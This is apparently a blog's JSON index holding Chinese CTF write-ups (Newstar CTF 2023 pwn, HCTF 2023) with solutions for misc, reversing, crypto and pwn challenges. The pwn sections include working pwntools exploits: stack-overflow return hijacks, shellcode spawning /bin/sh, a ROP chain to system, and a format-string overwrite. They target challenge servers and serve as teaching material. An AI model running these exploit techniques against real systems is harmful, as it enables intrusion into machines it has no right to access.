class=\"nn\"\u003epwn\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ep\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eremote\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;node4.buuoj.cn\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e29374\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#p = process(\u0026#39;/home/miyu/Desktop/ezshellcode\u0026#39;)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003econtext\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003elog_level\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;debug\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earch\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;amd64\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eos\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;linux\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eshellcode\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003easm\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eshellcraft\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esh\u003c/span\u003e\u003cspan class=\"p\"\u003e())\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#shellcode = b\u0026#39;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eshellcode\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ep\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esendlineafter\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Show me your magic\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ep\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003einteractive\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003ccode\u003epwntools\u003c/code\u003e生成的shellcode和\u003ccode\u003e\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\u003c/code\u003e都能过\u003c/p\u003e","title":"Newstar CTF 2023 pwn"},{"content":"一、Misc 1.玩原神玩的 分析：附件为一张图片\n观察最后一行，明显有flag的格式\n搜索得知是\n对照得flag为：hctf{yuanlainiyewanyuanshenhhh} 2.signin 附件为一段文本\nWzEwNCwgOTksIDExNiwgMTAyLCAxMjMsIDY2LCA5NywgMTE1LCAxMDEsIDk1LCA3MCwgNjQsIDEwOSwgMTA1LCA0OSwgMTIxLCA5NSwgNTIsIDExNCwgMTAxLCA5NSwgODYsIDk3LCAxMTQsIDEwNSwgNDgsIDExNywgMTE1LCAxMjVd base64解码后得到\n[104, 99, 116, 102, 123, 66, 97, 115, 101, 95, 70, 64, 109, 105, 49, 121, 95, 52, 114, 101, 95, 86, 97, 114, 105, 48, 117, 115, 125] 很明显是ASCII码\n编写py脚本\nascii_list = [104, 99, 116, 102, 123, 66, 97, 115, 101, 95, 70, 64, 109, 105, 49, 121, 95, 52, 114, 101, 95, 86, 97, 114, 105, 48, 117, 115, 125] # 将ASCII码转换为字符 result = \u0026#39;\u0026#39;.join(chr(num) for num in ascii_list) print(result) 得到hctf{Base_F@m1y_4re_Vari0us}\n3.Bomb 先用nc连接，然后多尝试几次发现炸弹的分布比较固定，对照着通关即可拿到flag\n二、Re 1.SDU的第一张考卷 将附件用 IDA pro打开\nmain函数里就有答案，最后一题需要猜，最多猜4次嘛（）\nflag：HCTF{ACCBDAADBB}\n2. XOR 一个简单的异或，告诉了我们enc数组和密钥key，将enc数组中的元素与key逐位异或即可\n写出py脚本：\nenc = [ 16, 115, 38, 25, 3, 67, 109, 114, 23, 21, 103,52, 75, 111, 97, 90, 47, 45, 101, 32, 91, 83, 83,93, 60, 28, 0, 41, 93, 1, 109, 122, 38, 28, 17 ,40, 81, 66, 75, 67, 60, 98] key = \u0026#39;HCTF2023\u0026#39; flag = \u0026#39;\u0026#39; for i in range(len(enc)): xor_result = enc[i] ^ ord(key[i % len(key)]) flag += chr(xor_result) print(flag) 输出为：X0r_1s_A_V3ry_Sign1ficant_Too1_In_Encrypt!\nflag：HCTF{X0r_1s_A_V3ry_Sign1ficant_Too1_In_Encrypt!}\n3.Maze 放入IDA阅读代码\nflag要进入一个check函数，我们继续阅读check函数\nstrcpy( maze, \u0026#34;********************U..**************.****..O*****...****.*******.******.*******........********************************\u0026#34;); count = 0; init_location = 20; while ( count \u0026lt;= 19 ) { v1 = count++; v2 = flag[v1]; if ( v2 == 100 ) { ++init_location; } else if ( v2 \u0026gt; 100 ) { if ( v2 == 115 ) { init_location += 15; } else if ( v2 == 119 ) { init_location -= 15; } } else if ( v2 == 97 ) { --init_location; } } return maze[init_location] == 79; } v2有wasd四种情况，想到上下左右四个方向\na 和 d 分别是位置-1和位置+1\n而 w 和 s 是-15和+15\n如果w s是向上下方向走的，则不难推出迷宫的规格为15×15\n根据给出的字符串画出迷宫\n***************\r*****U..*******\r*******.****..O\r*****...****.**\r*****.******.**\r*****........**\r***************\r*************** 代码里描述了起始位置为U，终点为O，则需要的操作为：\nddssaassdddddddwwwdd\nflag:HCTF{ddssaassdddddddwwwdd}\n三、pwn 1、gift nc连接即可\n2、Fly 先checksec一下\n64位且可以进行栈溢出\n然后我们阅读程序代码\nread函数可以进行栈溢出，但进入if中我们需要找到一个字符使它的ASCII码值为-105\n关于ASCII码为负值的原因可以参考：\nhttps://blog.csdn.net/kelehaier/article/details/59560419\n据此我们可以计算出实际的ASCII码为151\n然后我们查看buf的栈\n起始地址为0xD0\n溢出值为：\noffset = 0xD0+0x08 找到后门函数\n后门函数起始地址为： 构造payload为：\npayload = b\u0026#39;a\u0026#39;*offset+p64(0x40086E) exp:\nfrom pwn import * r = remote(\u0026#34;10.102.32.142\u0026#34;, 23961) ch = chr(151) offset = 0xD0+0x08 r.sendline(ch) payload = b\u0026#39;a\u0026#39;*offset+p64(0x40086E) r.sendline(payload) r.interactive() 成功拿到shell\n3.sdu_L0g1n 同样先checksec一下\n同样是64位且未开启栈保护\n拖进IDA分析程序\n发现有两次strcmp检测，我们需要绕过strcmp检测\n可以通过后面加\\x00的方法绕过\n找到后门函数：\n观察程序结构，我们可以考虑从main函数通过read的栈溢出溢出到后门函数的位置，这样就可以劫持后门函数获取shell权限\n经过反复调试，exp为\nfrom pwn import * r = remote(\u0026#34;10.102.32.142\u0026#34;, 26613) offset = 0x40 r.sendline(\u0026#39;SDUpwner\\x00\u0026#39;) payload = b\u0026#39;N1nEmAN is C.o0O0OOOOL!\\x00\u0026#39;+b\u0026#39;a\u0026#39;*offset +p64(0x4006C6) r.sendline(payload) r.interactive() 4.rdshellcode 打开附件，观察main函数\nint __cdecl main(int argc, const char **argv, const char **envp) { char buf[104]; // [rsp+0h] [rbp-70h] BYREF int v5; // [rsp+68h] [rbp-8h] BYREF int v6; // [rsp+6Ch] [rbp-4h] setvbuf(stdin, 0LL, 0, 0LL); setvbuf(stdout, 0LL, 1, 0LL); setvbuf(stderr, 0LL, 2, 0LL); puts(\u0026#34;I\u0026#39;m glad that you choose pwn\u0026#34;); puts(\u0026#34;But i am n0t sure you really love pwn or not\u0026#34;); puts(\u0026#34;Can\u0026#39;t you prove yourself?\u0026#34;); puts(\u0026#34;Tell me something....\u0026#34;); srand(0x2023u); v6 = rand() % 2 - 60; __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v5); if ( v6 != v5 ) { puts(\u0026#34;You DO Not Really Love PWN !\u0026#34;); exit(1); } puts(\u0026#34;Nice!!!!, you have proved your love for pwn\u0026#34;); printf(\u0026#34;It\u0026#39;s time for me: %p\\n\u0026#34;, buf); puts(\u0026#34;Dot\u0026#39; you want to make friends with me?\u0026#34;); read(0, buf, 0x100uLL); return 0; } v6实际上是一个伪随机数，一直为-59，我们让v5的值为-59即可 然后程序会输出一个地址 发现地址是随机化的，所以我们要用pwntools里的内置函数读取printf出的buf的地址\nexp如下：\nfrom pwn import * p = remote(\u0026#34;10.102.32.142\u0026#34;,27714) context(log_level = \u0026#39;debug\u0026#39;, arch = \u0026#39;amd64\u0026#39;, os = \u0026#39;linux\u0026#39;) shellcode=asm(shellcraft.sh()) p.sendline(b\u0026#39;-59\u0026#39;) p.recvuntil(b\u0026#39;:\u0026#39;) buf = p.recvline() print(buf) #shellcode = b\u0026#39;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\u0026#39; # shellcode = \u0026#39;\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\xb0\\x3b\\x0f\\x05\u0026#39; payload = b\u0026#39;A\u0026#39; * (0x70 + 8) + p64(int(buf,16) + 0x70 + 8 + 8) + shellcode p.sendline(payload) p.interactive() buf的栈深度是0x70，64位程序＋8，后面再＋8是shellcode地址的长度，于是我们可以得到如下模板\npayload = b\u0026#39;A\u0026#39; * (栈深度 + 8) + p64(int(栈地址,16) + 0x70 + 8 + 8) + shellcode shellcode我们可以用pwntools生成\ncontext(log_level = \u0026#39;debug\u0026#39;, arch = \u0026#39;amd64\u0026#39;, os = \u0026#39;linux\u0026#39;) shellcode=asm(shellcraft.sh()) 运行exp得到flag\n5.fleshman main函数如下：\nint __cdecl main(int argc, const char **argv, const char **envp) { char s[32]; // [rsp+0h] [rbp-20h] BYREF memset(s, 0, sizeof(s)); init(); puts(\u0026#34;We1c0me t0 SDU! Since y0u are f1esh here,te11 me s0mething ab0ut Y0u:\u0026#34;); puts(\u0026#34;Your name: \u0026#34;); read(0, s, 0x20uLL); puts(\u0026#34;Your ID: \u0026#34;); read(0, s, 0x28uLL); if ( !strcmp(s, \u0026#34;pwnner\u0026#34;) ) { printf(\u0026#34;\\nNice t0 mEEt y0u %s\u0026#34;, s); putchar(10); vuln(); } getflag(); return 0; } strcmp绕过＋构造ROP链 用ROPgadget查找出pop rdi的地址\nROPgadget --binary 文件路径 --only \u0026quot;pop|ret\u0026quot; | grep rdi\n然后套用rop链的模板 payload = b'a'*offset +p64(pop_rdi)+ p64(binsh)+p64(call_system)\nexp如下：\nfrom pwn import * p = remote(\u0026#34;10.102.32.142\u0026#34;,31698) p.sendline(b\u0026#39;miyu\u0026#39;) p.sendline(b\u0026#39;pwnner\\x00\u0026#39;) offset = 0x70 + 8 binsh = 0x402640 call_system=0x401392 pop_rdi = 0x401513 payload = b\u0026#39;a\u0026#39;*offset +p64(pop_rdi)+ p64(binsh)+p64(call_system) p.sendlineafter(b\u0026#39;WhAt can Y0u d0....\u0026#39;,payload) p.interactive() 得到flag\n6.rememberornot 观察main函数，发现只要计算100道题的答案即可获得flag 直接上脚本\nfrom pwn import * p = remote(\u0026#34;10.102.32.142\u0026#34;,38108) p.recvuntil(b\u0026#39;:\u0026#39;) for i in range(100): p.recvuntil(b\u0026#39;:\u0026#39;) expression = p.recvline() Expression = expression[:-3] print(Expression) ans = eval(Expression) Ans = str(ans) print(ans) p.sendline(Ans) p.interactive() 利用python内置的eval函数即可进行表达式的运算\nflag:HCTF{Y0U_RE@l1Y_REMEMbER_Y0uR_mA7H968ce06ba4d9}\n7.overflow 本题为最简单的栈溢出 vuln函数\nint vuln() { int result; // eax char v1[76]; // [rsp+0h] [rbp-50h] BYREF int v2; // [rsp+4Ch] [rbp-4h] v2 = 0; result = gets(v1); if ( v2 == 2 ) return system(\u0026#34;cat flag\u0026#34;); return result; } 直接对v1进行溢出即可\nexp：\nfrom pwn import * p = remote(\u0026#34;10.102.32.142\u0026#34;,22019) offset = 0x50+8 system_addr=0x401225 payload = b\u0026#39;a\u0026#39;*offset+p64(system_addr) p.sendline(payload) p.interactive() 8. gift军训版 关键函数如下：\nvoid __cdecl junxun() { char you; // [rsp+6h] [rbp-Ah] BYREF char fesitival; // [rsp+7h] [rbp-9h] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); fesitival = -127; puts(\u0026#34;\\x1B[33mMilitary training? When is the festival\\x1B[0m\u0026#34;); __isoc99_scanf(\u0026#34;%c\u0026#34;, \u0026amp;you); printf(\u0026#34;You believe 0x%hhx is the fesitival?\u0026#34;, (unsigned int)you); if ( fesitival != you ) { puts(\u0026#34; nononono...\u0026#34;); exit(1337); } puts(\u0026#34; yesyesyes!!!\u0026#34;); system(\u0026#34;sh\u0026#34;); } 又是熟悉的ASCII码为负值的情况\n实际的ASCII码为129\nexp：\nfrom pwn import * p = remote(\u0026#34;10.102.32.142\u0026#34;,47318) payload =chr(129) p.sendline(payload) p.interactive() 9.小明的家庭住址 本题核心点在于格式化字符串的利用\nmain函数：\nnt __cdecl main(int argc, const char **argv, const char **envp) { char buf[48]; // [rsp+0h] [rbp-70h] BYREF char format[56]; // [rsp+30h] [rbp-40h] BYREF unsigned __int64 v6; // [rsp+68h] [rbp-8h] v6 = __readfsqword(0x28u); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); puts(\u0026#34;\\n\\x1B[33m---------------------------------------------\u0026#34;); puts(\u0026#34;----------\\x1B[0m\\x1B[34mWelcome_to_address_SYSTEM\\x1B[0m\\x1B[33m----------\u0026#34;); puts(\u0026#34;---------------------------------------------\\x1B[0m\\n\u0026#34;); puts(\u0026#34;\\x1B[32;5mWhere is XiaoMing\u0026#39;s Home?\\x1B[0m\u0026#34;); read(0, buf, 0x30uLL); printf(buf); puts(\u0026#34;\\x1B[32;5mAnd where is XiaoHong\u0026#39;s?\\x1B[0m\u0026#34;); read(0, format, 0x30uLL); printf(format); return 0; } 对于这种printf没有任何限制条件的情况，我们可以利用格式化字符串漏洞\n首先我们利用%p得到ret寄存器的地址\n然后计算偏移\n偏移为13\n然后我们找到后门函数的地址0x40159C=4199836(十进制)\n可以构造%4199836c%14$lln\nexp如下：\nfrom pwn import* p = remote(\u0026#34;10.102.32.142\u0026#34;, 40682) p.recv() p.send(b\u0026#39;aaaa-%p\u0026#39;) p.recvuntil(b\u0026#39;Home?\\x1b[0m\\n\u0026#39;) addr = p.recv()[5:19] Addr = int(addr ,16) offset = 0x70+8 ret_addr = Addr+offset payload = b\u0026#39;%4199836c%14$lln\u0026#39;+p64(ret_addr) p.sendline(payload) p.interactive() 四、Crypto 1.caesar 偏移量11\nhctf{obviouslythisiscaesarcipher}\n2.not_caesar 维吉尼亚密码，且没有告诉我们密钥\n一个好用的网站 https://www.guballa.de/vigenere-solver\n通过统计字符出现的频率来爆破出密码（文本足够长）\nhctf{Icanbreakitwithoutkey}\n3.MathⅠ 题目如下：\nfrom Crypto.Util.number import * from secret import prng import os flag = os.environ.get(\u0026#39;FLAG\u0026#39;, \u0026#39;HCTF{this_is_a_sample_flag}\u0026#39;) #prng 参考2023新课标I卷P20 sys = prng() def constraint(): time = 1000 sample_a = [] sample_b = [] for _ in range(time): out = sys.next() sample_a.append(out[0]) sample_b.append(out[1]) assert all([sample_a[i]-sample_a[i-1] == sys.d for i in range(1, time)]) assert all([sample_b[i-1] == (i**2+i)/sample_a[i-1] for i in range(1, time)]) assert 3*sample_a[1] == 3*sample_a[0]+sample_a[2] return sum(sample_a[:777]+sample_b[:777]) def rsa_plus(m): p = getPrime(512) q = getPrime(512) n = p*q e = 0x10001 m = bytes_to_long(m.encode()) r1 = sys.next()[0] r2 = sys.next()[0] c = pow(pow(pow(m, e, n)*r1, e, n)*r2, e, n) h = 2*p+3*q return n, c, h h1 = constraint() n, c, h2 = rsa_plus(flag) print(f\u0026#39;n = {n}\u0026#39;) print(f\u0026#39;c = {c}\u0026#39;) print(f\u0026#39;hint1 = {h1}\u0026#39;) print(f\u0026#39;hint2 = {h2}\u0026#39;) \u0026#34;\u0026#34;\u0026#34; n = 123448414953228974011805323696137868781943298061640108583721204983031140531897314375841622324228108297198646457634512292527604743406056418492269259916712299664727931022315281719439527653756604578385299396113560339992952472500080663133453498156861989739986186852600863076353168997852910108312422507070843691527 c = 70355784775921655880380025465489949573241301926464797611681833071256665441460869302372712558837199110767728290007652944220079907048322612573185968943864339915304868935319658344195708544022979094906385190425552202576200107202487083736800245172584184112275476974513051986233708501062909943346214681580048469716 hint1 = 234850971.0 hint2 = 54673117809069678475594947601860826118221736045735845051744912971409541561632603188516528135267179886112707141940065852170163389165168708306257365103150093 \u0026#34;\u0026#34;\u0026#34; constraint()函数描述了2023新课标I卷P20的题干部分 并且告诉我们h1是$a_n$和$b_n$的前777项和，即 $$ S_{777}+T_{777}=h1 $$ 我们由此可以计算出$a_n$的通项公式为$a_n=777n$ 根据time=1000，我们可以得出$r_1$和$r_2$是数列$a_n$的第1001项和第1002项，即： $$ r_1=777\\times1001\\ r_2=777\\times1002 $$ 然后根据含有$p,q$的两个式子，可以得到一个二元方程组：\n$$ \\begin{cases} pq=n\\ 2p+3*q=hint2 \\end{cases} $$ 其中$n$和$hint2$都是已知的，因此我们可以解出$p$和$q$。\nfrom sympy import symbols, Eq, solve import gmpy2 # 定义未知数 p, q = symbols(\u0026#34;p q\u0026#34;) # 解方程 expr2 = [2*p+3*q-54673117809069678475594947601860826118221736045735845051744912971409541561632603188516528135267179886112707141940065852170163389165168708306257365103150093, p*q-123448414953228974011805323696137868781943298061640108583721204983031140531897314375841622324228108297198646457634512292527604743406056418492269259916712299664727931022315281719439527653756604578385299396113560339992952472500080663133453498156861989739986186852600863076353168997852910108312422507070843691527] r2 = solve(expr2, [p, q]) print(\u0026#34;r2:\u0026#34;, r2) 得到：\np = 12384051763953430863668172341605062087552196009776396484360059546294965143403046818805051855772540020996782547927228938821561716941140613694437078638123523 q = 9968338093720938916086200972883567314372448008727684027674931292939870424942169850302141474574033281373047348695202658175679985094295826972461069275634349\n然后我们根据c = pow(pow(pow(m, e, n)*r1, e, n)*r2, e, n) 进行解密\nexp如下：\nimport gmpy2 from Crypto.Util.number import * r1=1001*777 r2=1002*777 p = 12384051763953430863668172341605062087552196009776396484360059546294965143403046818805051855772540020996782547927228938821561716941140613694437078638123523 q = 9968338093720938916086200972883567314372448008727684027674931292939870424942169850302141474574033281373047348695202658175679985094295826972461069275634349 c = 70355784775921655880380025465489949573241301926464797611681833071256665441460869302372712558837199110767728290007652944220079907048322612573185968943864339915304868935319658344195708544022979094906385190425552202576200107202487083736800245172584184112275476974513051986233708501062909943346214681580048469716 e = 0x10001 n = 123448414953228974011805323696137868781943298061640108583721204983031140531897314375841622324228108297198646457634512292527604743406056418492269259916712299664727931022315281719439527653756604578385299396113560339992952472500080663133453498156861989739986186852600863076353168997852910108312422507070843691527 phi = (p - 1) * (q - 1) d = gmpy2.invert(e, phi) m = pow(c, d, n) c1 = m*gmpy2.invert(r2, n) m1 = pow(c1, d, n) c2 = m1*gmpy2.invert(r1, n) m2 = pow(c2, d, n) print(long_to_bytes(m2).decode()) 在共模下做除法我们需要求出r1和r2关于n的逆元$r_1^{-1}$和$r_2^{-1}$\n最终解得flag为：\nHCTF{D0_y0u_900d_4t_m47h?###}\n","permalink":"https://smera1d0.github.io/posts/hctf-2023-wp/","summary":"\u003ch3 id=\"一misc\"\u003e一、Misc\u003c/h3\u003e\n\u003ch4 id=\"1玩原神玩的\"\u003e1.玩原神玩的\u003c/h4\u003e\n\u003cp\u003e分析：附件为一张图片\u003c/p\u003e\n\u003cimg src=\"https://s2.loli.net/2023/08/27/mCawcHF5rT1tROf.png\" alt=\"玩原神玩的.png\" style=\"zoom: 33%;\" /\u003e\r\n\u003cp\u003e观察最后一行，明显有flag的格式\u003c/p\u003e\n\u003cp\u003e搜索得知是\u003c/p\u003e\n\u003cimg src=\"https://s2.loli.net/2023/08/26/D4RmacsHCtXhvM9.png\" alt=\"image.png\" style=\"zoom: 67%;\" /\u003e\r\n\u003cp\u003e对照得flag为：\u003ccode\u003ehctf{yuanlainiyewanyuanshenhhh} \u003c/code\u003e\u003c/p\u003e","title":"HCTF 2023 wp"}]